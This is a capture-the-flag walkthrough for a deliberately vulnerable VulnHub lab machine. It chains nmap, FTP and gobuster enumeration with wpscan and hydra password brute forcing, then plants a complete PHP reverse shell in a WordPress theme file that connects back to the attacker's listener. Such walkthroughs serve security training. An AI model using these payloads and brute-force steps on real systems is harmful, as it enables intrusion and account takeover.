::::::::::::::::::::::::: page
# BSides Vancouver: 2018 (Workshop) {#bsides-vancouver-2018-workshop .title}

\

## 

## BSides Vancouver: 2018 (Workshop)

- **[BSides Vancouver: 2018 (Workshop)]{style="color:#060f94;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/>

![](images/858-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#f6d32d;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/858-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.172
:::

![](images/858-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.172
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.172 
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.172
:::

![](images/858-4.png)

1.  [FTP Enumeration]{style="color:#f6d32d;"} :

- FTP login with anonymous user :

::: codebox
    ftp 192.168.2.172
:::

- Check the file list :

::: codebox
    ls
:::

- Navigate the directory :

::: codebox
    cd public
:::

- Download the file :

::: codebox
    get users.txt.bk
:::

![](images/858-5.png)

- Read the file :

::: codebox
    cat users.txt.bk
:::

![](images/858-6.png)

- Found the user\'s :

::: codebox
    abatchy
    john
    mai
    anne
    doomguy
:::

1.  [Web Enumeration]{style="color:#f6d32d;"} :
2.  IP visit the browser : <http://192.168.2.172>
    <http://192.168.2.172/robots.txt>
    <http://192.168.2.172/backup_wordpress/>

- Now run the gobuster for the directory brute force :

::: codebox
    gobuster dir -u http://192.168.2.172/backup_wordpress/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
:::

![](images/858-7.png)

- Visit the endpoints :
  <http://192.168.2.172/backup_wordpress/wp-admin/>

![](images/858-8.png) Found the login page .

- Now use john username and brute force the password :

::: codebox
    wpscan --url http://192.168.2.172/backup_wordpress/ -U john -P /opt/rockyou.txt
:::

![](images/858-9.png)

- Login the wordpress :

::: codebox
    Username : john
    Password : enigma
:::

- Successfully login the wordpress :

![](images/858-10.png)

1.  [Reverse Shell]{style="color:#f6d32d;"} :

- After login the wordpress go to appearance :

::: codebox
    Appearance → Editor → footer.php
:::

- Start the listener :

::: codebox
    nc -nlvp 443
:::

- Enter the reverse shell payload :

::: codebox
    <?php

    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '192.168.2.219';  // CHANGE THIS
    $port = 443;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;

    //
    // Daemonise ourself if possible to avoid zombies later
    //

    // pcntl_fork is hardly ever available, but will allow us to daemonise
    // our php process and avoid zombies.  Worth a try...
    if (function_exists('pcntl_fork')) {
       // Fork and have the parent process exit
      $pid = pcntl_fork();
      
      if ($pid == -1) {
         printit("ERROR: Can't fork");
           exit(1);
      }
     
      if ($pid) {
           exit(0);  // Parent exits
     }

       // Make the current process a session leader
      // Will only succeed if we forked
     if (posix_setsid() == -1) {
           printit("Error: Can't setsid()");
           exit(1);
      }

       $daemon = 1;
    } else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
    }

    // Change to a safe directory
    chdir("/");

    // Remove any umask we inherited
    umask(0);

    //
    // Do the reverse shell...
    //

    // Open reverse connection
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
    }

    // Spawn shell process
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (!is_resource($process)) {
      printit("ERROR: Can't spawn shell");
        exit(1);
    }

    // Set everything to non-blocking
    // Reason: Occsionally reads will block, even though stream_select tells us they won't
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    printit("Successfully opened reverse shell to $ip:$port");

    while (1) {
       // Check for end of TCP connection
        if (feof($sock)) {
            printit("ERROR: Shell connection terminated");
          break;
        }

       // Check for end of STDOUT
        if (feof($pipes[1])) {
            printit("ERROR: Shell process terminated");
         break;
        }

       // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
     $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
       // data to process's STDIN
        if (in_array($sock, $read_a)) {
           if ($debug) printit("SOCK READ");
           $input = fread($sock, $chunk_size);
           if ($debug) printit("SOCK: $input");
            fwrite($pipes[0], $input);
        }

       // If we can read from the process's STDOUT
       // send data down tcp connection
      if (in_array($pipes[1], $read_a)) {
           if ($debug) printit("STDOUT READ");
         $input = fread($pipes[1], $chunk_size);
           if ($debug) printit("STDOUT: $input");
          fwrite($sock, $input);
        }

       // If we can read from the process's STDERR
       // send data down tcp connection
      if (in_array($pipes[2], $read_a)) {
           if ($debug) printit("STDERR READ");
         $input = fread($pipes[2], $chunk_size);
           if ($debug) printit("STDERR: $input");
          fwrite($sock, $input);
        }
    }

    fclose($sock);
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);

    // Like print, but does nothing if we've daemonised ourself
    // (I can't figure out how to redirect STDOUT like a proper daemon)
    function printit ($string) {
       if (!$daemon) {
           print "$string\n";
      }
    }

    ?> 
:::

![](images/858-11.png)

- Now again visit the /backup_wordpress endpoints :

::: codebox
    http://192.168.2.172/backup_wordpress/
:::

- We got the shell :

![](images/858-12.png)

1.  [SSH Access]{style="color:#f6d32d;"} :

- We have the user list :

::: codebox
    abatchy
    john
    mai
    anne
    doomguy
:::

- Try every user to get the ssh connection :

![](images/858-13.png) Every user get the permission denied only anne
user recommended the password .

- SSH brute force :

::: codebox
    hydra -l anne -P /opt/rockyou.txt ssh://192.168.2.172
:::

![](images/858-14.png)

- We found the password :

::: codebox
    Username : anne
    Password : princess
:::

- Now ssh login with anne user :

::: codebox
    ssh anne@192.168.2.172
:::

![](images/858-15.png)
:::::::::::::::::::::::::
